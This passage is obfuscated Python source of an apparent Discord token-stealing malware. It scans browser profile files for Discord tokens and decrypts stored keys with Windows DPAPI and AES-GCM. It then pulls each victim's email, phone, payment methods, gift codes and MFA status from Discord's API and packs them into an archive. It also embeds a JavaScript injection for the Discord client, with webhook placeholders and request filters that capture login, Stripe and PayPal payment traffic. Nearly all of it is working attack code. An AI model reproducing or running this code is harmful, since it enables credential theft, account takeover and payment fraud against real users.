            for BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, _, v4r_files in os.walk(os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "Mozilla", "Firefox", "Profiles")):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(os.path.join(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, v4r__file), errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH in re.findall(NXZLADNAGNEILSCBDAVQSSJDUPOVLJELWQLSMAWUOVQWVMPJEHHWIJHZRRR, v4r_line.strip()):
                                    if LLAUJEGMQHEWYWNTSNHHUEGZJQXAIKRVGQPKRTVQFAGRFUUKTNMRBKXVW(QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH, JJWOARJNTTIPUMNJUEADQJZIQXEUKHYVYJFHNRHPHHWHQZYGSKGXISUAXNRDUNYFGNORAVUHOROOPYTW):
                                        TRNOTBGSRXPESQZIKUKAIRGIETGFMHENENFKGDQKALKDIZULVFXHSEPKXH = requests.get(JJWOARJNTTIPUMNJUEADQJZIQXEUKHYVYJFHNRHPHHWHQZYGSKGXISUAXNRDUNYFGNORAVUHOROOPYTW, headers={'Authorization': QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH}).json()['id']
                                        if TRNOTBGSRXPESQZIKUKAIRGIETGFMHENENFKGDQKALKDIZULVFXHSEPKXH not in GXQRDSXYACEJSDHYTGBNWCNWAZNEJWQNVRAHYCBCLYPOHBWYUAPJWQAJVHUDUKZQB:
                                            SEEXUUULQTOCDMMZIFMACCCPFDPANIAIXEFWPPPCVVBUFDGAIFEVWTHBMOFFVDDBEXHVBSTRJLDCLLKFDBIDYIJQWRF.append(QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH)
                                            GXQRDSXYACEJSDHYTGBNWCNWAZNEJWQNVRAHYCBCLYPOHBWYUAPJWQAJVHUDUKZQB.append(TRNOTBGSRXPESQZIKUKAIRGIETGFMHENENFKGDQKALKDIZULVFXHSEPKXH)
                                            HXERNJKKNPZDCERIZOHFMLHYTRWVDMRMDOCMONFWRMTLZQFJUCDNSLEQASCHHSRLTPYZDMUVDODGRRREIAKNQKZOTYQNVPNHN[QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH] = ('Firefox', os.path.join(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, v4r__file))
        return SEEXUUULQTOCDMMZIFMACCCPFDPANIAIXEFWPPPCVVBUFDGAIFEVWTHBMOFFVDDBEXHVBSTRJLDCLLKFDBIDYIJQWRF, HXERNJKKNPZDCERIZOHFMLHYTRWVDMRMDOCMONFWRMTLZQFJUCDNSLEQASCHHSRLTPYZDMUVDODGRRREIAKNQKZOTYQNVPNHN

    def LLAUJEGMQHEWYWNTSNHHUEGZJQXAIKRVGQPKRTVQFAGRFUUKTNMRBKXVW(QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH, JJWOARJNTTIPUMNJUEADQJZIQXEUKHYVYJFHNRHPHHWHQZYGSKGXISUAXNRDUNYFGNORAVUHOROOPYTW):
        return requests.get(JJWOARJNTTIPUMNJUEADQJZIQXEUKHYVYJFHNRHPHHWHQZYGSKGXISUAXNRDUNYFGNORAVUHOROOPYTW, headers={'Authorization': QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH}).status_code == 200

    def ZDSNZWOYTHNBFKJSWQHPILSTVSBDQXZKAZDMXISTBAHLWBAOKYKIUZMTRLLLENHXGPXDGVCCRSOOCAHBRVFTHMZKLVal(IZYEBNTQJDIBYEVKWOXNVQSAVCGXOVZUMIFZJCEXFZHMGCTFWYSDTHXCBMKEYNGGNM, FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM):
        WCYNCEJVNSLWPHUWNEFQBMCOFWTASEDBDXPKUPCXHSFSOYBZFUEWOQNCCUNEPLNFUKJRCXDIKT = IZYEBNTQJDIBYEVKWOXNVQSAVCGXOVZUMIFZJCEXFZHMGCTFWYSDTHXCBMKEYNGGNM[3:15]
        KPKSCHWFYAYPEYDJQISNTXESXQNKMYCVKRKQOTOSVTKCXOBLRIDVBGLCSUGSSWUOEREQUCIMNQYODBMCXP = IZYEBNTQJDIBYEVKWOXNVQSAVCGXOVZUMIFZJCEXFZHMGCTFWYSDTHXCBMKEYNGGNM[15:]
        FEHRFYRUREAIUXLKVTQSUDXCFNSAEZAHXABIFLRKDWPOREKMWDUNWYSBLDR = AES.new(FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM, AES.MODE_GCM, WCYNCEJVNSLWPHUWNEFQBMCOFWTASEDBDXPKUPCXHSFSOYBZFUEWOQNCCUNEPLNFUKJRCXDIKT)
        return FEHRFYRUREAIUXLKVTQSUDXCFNSAEZAHXABIFLRKDWPOREKMWDUNWYSBLDR.decrypt(KPKSCHWFYAYPEYDJQISNTXESXQNKMYCVKRKQOTOSVTKCXOBLRIDVBGLCSUGSSWUOEREQUCIMNQYODBMCXP)[:-16].decode()

    def EXNPYQCEWBCCFBQLNUXKUAVXUJEKEYSNYBRYNMSTACQJEKSVMSSCKRVQHHBIKGHKZFAEELNKDYQFXNYDHXFY(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ):
        if not os.path.exists(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ):
            return None
        with open(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, "r", encoding="utf-8") as v4r_f:
            IGCCUYUQDJPCHALKBFVHYUKENSXVLPHNRCJLYSBOTKVNAZKYGDSNZZZCS = json.load(v4r_f)
        FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM = base64.b64decode(IGCCUYUQDJPCHALKBFVHYUKENSXVLPHNRCJLYSBOTKVNAZKYGDSNZZZCS["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM, None, None, None, 0)[1]

    SEEXUUULQTOCDMMZIFMACCCPFDPANIAIXEFWPPPCVVBUFDGAIFEVWTHBMOFFVDDBEXHVBSTRJLDCLLKFDBIDYIJQWRF, HXERNJKKNPZDCERIZOHFMLHYTRWVDMRMDOCMONFWRMTLZQFJUCDNSLEQASCHHSRLTPYZDMUVDODGRRREIAKNQKZOTYQNVPNHN = IUGKUBRYCOJWITNBAMOCKEBBBZOWFZLCIMJBCBOLJKWOGXBLOSIHXKUIRXDKNYVBBUT()
    
    if not SEEXUUULQTOCDMMZIFMACCCPFDPANIAIXEFWPPPCVVBUFDGAIFEVWTHBMOFFVDDBEXHVBSTRJLDCLLKFDBIDYIJQWRF:
        JDFEZDCKYFEIIQMFHQYNTGNZVSOGGQYFEERVUJWKEHZGUVXFVUOWRUHNILYHITITIUJSYNJOJTUFVWKFEXNBVOSZZRYONL = "No discord tokens found."

    for QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH_d15c0rd in SEEXUUULQTOCDMMZIFMACCCPFDPANIAIXEFWPPPCVVBUFDGAIFEVWTHBMOFFVDDBEXHVBSTRJLDCLLKFDBIDYIJQWRF:
        YFEZMISLJMYSWEDZLYCLSTXZUXKOCPQTPFZCEFBJSRTBEYRTGWKZVGGYCBHLVMLWCBOIKKFCBMVEOVYHRXKJFT += 1

        try: IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH_d15c0rd}).json()
        except: IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT = {"None": "None"}

        BTADJUSYXROJUKJRFFKFOZFFWFRDXCBWWDLEEXDHLZIWJLKWSOEUQZJBGCSIZGYXZQRWXEPOKXAJCH = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('username', "None") + '#' + IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('discriminator', "None")
        GVMMNRULKWPVIOVOMJAFRTYEZXGDKGTHXCEUZKZZNWHOTJOXZOSPRDVCQSYRCIFCFSWKTYABQPDBUTNTOLZSZQORB = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('global_name', "None")
        MUKQGIXARWYYVVQVDEIWBSDQVECSTUWHFJYQNRFSBAKRAGFEAFJFJYPYWPBIGGHBWQCUZWLOFHQWJTVWCPVNKRXQZLSPV = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('id', "None")
        WMQFYZEIKVKHJQMMZTMQMAWXLBMZDCABRLOVMMFGSCETZVSDGPIKPYSESXOBKSIHYBUAVLNEAJBZVFWFPODPTEWYDVZEGVUMNX = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('email', "None")
        OAOFVMUNNXUOKWGTDDWQFEBSXWHGLHBYFWVSTQDBBYBQWTMGBMS = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('verified', "None")
        RCJFVFPXPSCKXJCQUQDWOTMGWDJTGIHNQVCBSPVYPQBHTIAFUGHTWNIRWUREOHSFBVYCOELVZWFBSTSVXBAGCXUOYKKIUTG = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('phone', "None")
        HYONYZNJDEDJEPGEKOPVGCQNTXEBWIRWKYWAANFESOJOTXCJHRFUMGQYEHJDOQE = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('locale', "None")
        NURXFSEDXLGIGSQBHECIWROUULVDVCIGYWEZTCKVSRADYCGLYFZPUKEWIVRNZAHFQRZLQWOY = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('mfa_enabled', "None")

        try:
            if IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('premium_type', 'None') == 0:
                HOIUUOLUXTAPPOVCIDWOQKLVAEOSTMSZBLXSUAFQNMWEWCVHLJDXWAGYCLZFKVNFSNXFKYUGPOBODXZHJ = 'False'
            elif IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('premium_type', 'None') == 1:
                HOIUUOLUXTAPPOVCIDWOQKLVAEOSTMSZBLXSUAFQNMWEWCVHLJDXWAGYCLZFKVNFSNXFKYUGPOBODXZHJ = 'Nitro Classic'
            elif IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('premium_type', 'None') == 2:
                HOIUUOLUXTAPPOVCIDWOQKLVAEOSTMSZBLXSUAFQNMWEWCVHLJDXWAGYCLZFKVNFSNXFKYUGPOBODXZHJ = 'Nitro Boosts'
            elif IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('premium_type', 'None') == 3:
                HOIUUOLUXTAPPOVCIDWOQKLVAEOSTMSZBLXSUAFQNMWEWCVHLJDXWAGYCLZFKVNFSNXFKYUGPOBODXZHJ = 'Nitro Basic'
            else:
                HOIUUOLUXTAPPOVCIDWOQKLVAEOSTMSZBLXSUAFQNMWEWCVHLJDXWAGYCLZFKVNFSNXFKYUGPOBODXZHJ = 'False'
        except:
            HOIUUOLUXTAPPOVCIDWOQKLVAEOSTMSZBLXSUAFQNMWEWCVHLJDXWAGYCLZFKVNFSNXFKYUGPOBODXZHJ = "None"

        try: BVTJCAYYHZTGTPWPRGRDYTPPZACEPBCGQPVQJGURMOFJWBPYGAMLGTGOLFKRIMYIYCOJMTMPOXFZ = f"https://cdn.discordapp.com/avatars/{MUKQGIXARWYYVVQVDEIWBSDQVECSTUWHFJYQNRFSBAKRAGFEAFJFJYPYWPBIGGHBWQCUZWLOFHQWJTVWCPVNKRXQZLSPV}/{IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{MUKQGIXARWYYVVQVDEIWBSDQVECSTUWHFJYQNRFSBAKRAGFEAFJFJYPYWPBIGGHBWQCUZWLOFHQWJTVWCPVNKRXQZLSPV}/{IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{MUKQGIXARWYYVVQVDEIWBSDQVECSTUWHFJYQNRFSBAKRAGFEAFJFJYPYWPBIGGHBWQCUZWLOFHQWJTVWCPVNKRXQZLSPV}/{IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT['avatar']}.png"
        except: BVTJCAYYHZTGTPWPRGRDYTPPZACEPBCGQPVQJGURMOFJWBPYGAMLGTGOLFKRIMYIYCOJMTMPOXFZ = "None"

        try:
            UJCTWBTIPKQGAAEGQZRTIMCSOQGQQDETVDGXAMBRQACRBUFNTOKHCASMSPDMBDLQZRRAZCYLPXXTNWVWL = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH_d15c0rd}).json()
            if UJCTWBTIPKQGAAEGQZRTIMCSOQGQQDETVDGXAMBRQACRBUFNTOKHCASMSPDMBDLQZRRAZCYLPXXTNWVWL:
                PELXTQHZOIOHADVFYMKQKYQFFDPEROXWGZBGLYURWXEAZNGNMXAKZYHWVHDSCKTRROWALDBKCFFBSV = []

                for v4r_method in UJCTWBTIPKQGAAEGQZRTIMCSOQGQQDETVDGXAMBRQACRBUFNTOKHCASMSPDMBDLQZRRAZCYLPXXTNWVWL:
                    if v4r_method['type'] == 1:
                        PELXTQHZOIOHADVFYMKQKYQFFDPEROXWGZBGLYURWXEAZNGNMXAKZYHWVHDSCKTRROWALDBKCFFBSV.append('Bank Card')
                    elif v4r_method['type'] == 2:
                        PELXTQHZOIOHADVFYMKQKYQFFDPEROXWGZBGLYURWXEAZNGNMXAKZYHWVHDSCKTRROWALDBKCFFBSV.append("Paypal")
                    else:
                        PELXTQHZOIOHADVFYMKQKYQFFDPEROXWGZBGLYURWXEAZNGNMXAKZYHWVHDSCKTRROWALDBKCFFBSV.append('Other')
                PELXTQHZOIOHADVFYMKQKYQFFDPEROXWGZBGLYURWXEAZNGNMXAKZYHWVHDSCKTRROWALDBKCFFBSV = ' / '.join(PELXTQHZOIOHADVFYMKQKYQFFDPEROXWGZBGLYURWXEAZNGNMXAKZYHWVHDSCKTRROWALDBKCFFBSV)
            else:
                PELXTQHZOIOHADVFYMKQKYQFFDPEROXWGZBGLYURWXEAZNGNMXAKZYHWVHDSCKTRROWALDBKCFFBSV = "None"
        except:
            PELXTQHZOIOHADVFYMKQKYQFFDPEROXWGZBGLYURWXEAZNGNMXAKZYHWVHDSCKTRROWALDBKCFFBSV = "None"

        try:
            QFYTWAKWDXGQLKLQUOCBHZRIEXGJQIJUIMTCJKPMMTKCCKYFBXMI = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH_d15c0rd}).json()
            if QFYTWAKWDXGQLKLQUOCBHZRIEXGJQIJUIMTCJKPMMTKCCKYFBXMI:
                WAINBFZRYYLURRAGXDXPBZCDMIRGPDUXGAFMHEYUSVRQGZJYHHDETSMRHZJQUDJVC = []
                for NAGAOIDLBXHWXBEEWJIBJQBWZHEGSTCXGCADQFJSGXVHAYOFVEVGZDCGPO in QFYTWAKWDXGQLKLQUOCBHZRIEXGJQIJUIMTCJKPMMTKCCKYFBXMI:
                    GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON = NAGAOIDLBXHWXBEEWJIBJQBWZHEGSTCXGCADQFJSGXVHAYOFVEVGZDCGPO['promotion']['outbound_title']
                    NAGAOIDLBXHWXBEEWJIBJQBWZHEGSTCXGCADQFJSGXVHAYOFVEVGZDCGPO = NAGAOIDLBXHWXBEEWJIBJQBWZHEGSTCXGCADQFJSGXVHAYOFVEVGZDCGPO['code']
                    GLSDPETQCIALFRNDZPZJZDDFUCOJZYKUHSEZJDYHJSZZPOTAVFWBTMHYUFXZO = f"Gift: \"{GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON}\" Code: \"{NAGAOIDLBXHWXBEEWJIBJQBWZHEGSTCXGCADQFJSGXVHAYOFVEVGZDCGPO}\""
                    if len('\n\n'.join(NAGAOIDLBXHWXBEEWJIBJQBWZHEGSTCXGCADQFJSGXVHAYOFVEVGZDCGPO)) + len(GLSDPETQCIALFRNDZPZJZDDFUCOJZYKUHSEZJDYHJSZZPOTAVFWBTMHYUFXZO) >= 1024:
                        break
                    WAINBFZRYYLURRAGXDXPBZCDMIRGPDUXGAFMHEYUSVRQGZJYHHDETSMRHZJQUDJVC.append(GLSDPETQCIALFRNDZPZJZDDFUCOJZYKUHSEZJDYHJSZZPOTAVFWBTMHYUFXZO)
                if len(WAINBFZRYYLURRAGXDXPBZCDMIRGPDUXGAFMHEYUSVRQGZJYHHDETSMRHZJQUDJVC) > 0:
                    NAGAOIDLBXHWXBEEWJIBJQBWZHEGSTCXGCADQFJSGXVHAYOFVEVGZDCGPO = '\n\n'.join(WAINBFZRYYLURRAGXDXPBZCDMIRGPDUXGAFMHEYUSVRQGZJYHHDETSMRHZJQUDJVC)
                else:
                    NAGAOIDLBXHWXBEEWJIBJQBWZHEGSTCXGCADQFJSGXVHAYOFVEVGZDCGPO = "None"
            else:
                NAGAOIDLBXHWXBEEWJIBJQBWZHEGSTCXGCADQFJSGXVHAYOFVEVGZDCGPO = "None"
        except:
            NAGAOIDLBXHWXBEEWJIBJQBWZHEGSTCXGCADQFJSGXVHAYOFVEVGZDCGPO = "None"
    
        try: v4r_software_name, BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ = HXERNJKKNPZDCERIZOHFMLHYTRWVDMRMDOCMONFWRMTLZQFJUCDNSLEQASCHHSRLTPYZDMUVDODGRRREIAKNQKZOTYQNVPNHN.get(QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH_d15c0rd, ("Unknown", "Unknown"))
        except: v4r_software_name, BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ = "Unknown", "Unknown"

        JDFEZDCKYFEIIQMFHQYNTGNZVSOGGQYFEERVUJWKEHZGUVXFVUOWRUHNILYHITITIUJSYNJOJTUFVWKFEXNBVOSZZRYONL = JDFEZDCKYFEIIQMFHQYNTGNZVSOGGQYFEERVUJWKEHZGUVXFVUOWRUHNILYHITITIUJSYNJOJTUFVWKFEXNBVOSZZRYONL + f"""
Discord Account n°{str(YFEZMISLJMYSWEDZLYCLSTXZUXKOCPQTPFZCEFBJSRTBEYRTGWKZVGGYCBHLVMLWCBOIKKFCBMVEOVYHRXKJFT)}:
 - Path Found      : {BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ}
 - Software        : {v4r_software_name}
 - Token           : {QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH_d15c0rd}
 - Username        : {BTADJUSYXROJUKJRFFKFOZFFWFRDXCBWWDLEEXDHLZIWJLKWSOEUQZJBGCSIZGYXZQRWXEPOKXAJCH}
 - Display Name    : {GVMMNRULKWPVIOVOMJAFRTYEZXGDKGTHXCEUZKZZNWHOTJOXZOSPRDVCQSYRCIFCFSWKTYABQPDBUTNTOLZSZQORB}
 - Id              : {MUKQGIXARWYYVVQVDEIWBSDQVECSTUWHFJYQNRFSBAKRAGFEAFJFJYPYWPBIGGHBWQCUZWLOFHQWJTVWCPVNKRXQZLSPV}
 - Email           : {WMQFYZEIKVKHJQMMZTMQMAWXLBMZDCABRLOVMMFGSCETZVSDGPIKPYSESXOBKSIHYBUAVLNEAJBZVFWFPODPTEWYDVZEGVUMNX}
 - Email Verified  : {OAOFVMUNNXUOKWGTDDWQFEBSXWHGLHBYFWVSTQDBBYBQWTMGBMS}
 - Phone           : {RCJFVFPXPSCKXJCQUQDWOTMGWDJTGIHNQVCBSPVYPQBHTIAFUGHTWNIRWUREOHSFBVYCOELVZWFBSTSVXBAGCXUOYKKIUTG}
 - Nitro           : {HOIUUOLUXTAPPOVCIDWOQKLVAEOSTMSZBLXSUAFQNMWEWCVHLJDXWAGYCLZFKVNFSNXFKYUGPOBODXZHJ}
 - Language        : {HYONYZNJDEDJEPGEKOPVGCQNTXEBWIRWKYWAANFESOJOTXCJHRFUMGQYEHJDOQE}
 - Billing         : {PELXTQHZOIOHADVFYMKQKYQFFDPEROXWGZBGLYURWXEAZNGNMXAKZYHWVHDSCKTRROWALDBKCFFBSV}
 - Gift Code       : {NAGAOIDLBXHWXBEEWJIBJQBWZHEGSTCXGCADQFJSGXVHAYOFVEVGZDCGPO}
 - Profile Picture : {BVTJCAYYHZTGTPWPRGRDYTPPZACEPBCGQPVQJGURMOFJWBPYGAMLGTGOLFKRIMYIYCOJMTMPOXFZ}
 - Multi-Factor Authentication : {NURXFSEDXLGIGSQBHECIWROUULVDVCIGYWEZTCKVSRADYCGLYFZPUKEWIVRNZAHFQRZLQWOY}
"""
    DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.writestr(f"Discord Accounts ({YFEZMISLJMYSWEDZLYCLSTXZUXKOCPQTPFZCEFBJSRTBEYRTGWKZVGGYCBHLVMLWCBOIKKFCBMVEOVYHRXKJFT}).txt", JDFEZDCKYFEIIQMFHQYNTGNZVSOGGQYFEERVUJWKEHZGUVXFVUOWRUHNILYHITITIUJSYNJOJTUFVWKFEXNBVOSZZRYONL)

    return YFEZMISLJMYSWEDZLYCLSTXZUXKOCPQTPFZCEFBJSRTBEYRTGWKZVGGYCBHLVMLWCBOIKKFCBMVEOVYHRXKJFT

KDNGGZWVUFNRKUSVMMZNQCBBAXTKXTUBQQKZOPCFNHYRYVPQAEFPEKKQCDSRQYYCKNCZWMGS = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

